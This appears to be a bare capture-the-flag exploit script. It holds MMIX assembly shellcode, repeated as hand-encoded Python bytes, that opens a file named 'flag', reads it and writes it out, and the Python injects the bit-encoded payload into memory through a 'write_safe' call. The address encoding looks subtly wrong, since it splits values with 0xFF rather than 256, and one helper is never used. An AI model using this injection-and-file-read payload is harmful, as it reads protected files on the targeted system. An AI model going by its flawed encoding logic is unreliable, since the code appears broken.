"""
PIE_LOC  IS #200
F_LOC    IS PIE_LOC+#28
      
         LOC  PIE_LOC
Main     SET  $255,F_LOC+#8
         TRAP 0,Fopen,3
         SET  $255,F_LOC+#12
         TRAP 0,Fread,3
         SET  $255,F_LOC+#12
         TRAP 0,Fwrite,1

         LOC F_LOC
flage    BYTE "flag"
         OCTA F_LOC
         OCTA #0
         OCTA F_LOC+#16
"""

SETI = 0xE3
TRAP = 0x00

FOPENC  = 0x1
FREADC  = 0x3
FWRITEC = 0x6

def LDVTS(dunno):
	return [0x98, 0x07, 0x00, dunno]

def tloc(loc):
	loc = loc + 0x200 + 0x28
	assert loc < 0xFFFF
	return [loc / 0xFF, loc % 0xFF]

def prog(bs, loc):
	code = [
		[SETI, 255] + tloc(loc + 0x8),
		[TRAP, 0, FOPENC, 3],
		[SETI, 255] + tloc(loc + 0x12),
		[TRAP, 0, FREADC, 3],
		[SETI, 255] + tloc(loc + 0x12),
		[TRAP, 0, FWRITEC, 1],
	]

	data = [
		[ord("f"), ord("l"), ord("a"), ord("g"), 0, 0, 0, 0],
		[0, 0] + tloc(loc) + [0, 0, 0, 0],
		[0, 0] + tloc(loc + 0x16)
	]

	out = ""
	for entry in code + data:
		for byte in entry:
			bstr = bin(byte)[2:]
			bstr = "0"*(8 - len(bstr)) + bstr
			out += bstr

	bs.write_safe(loc, len(out), out)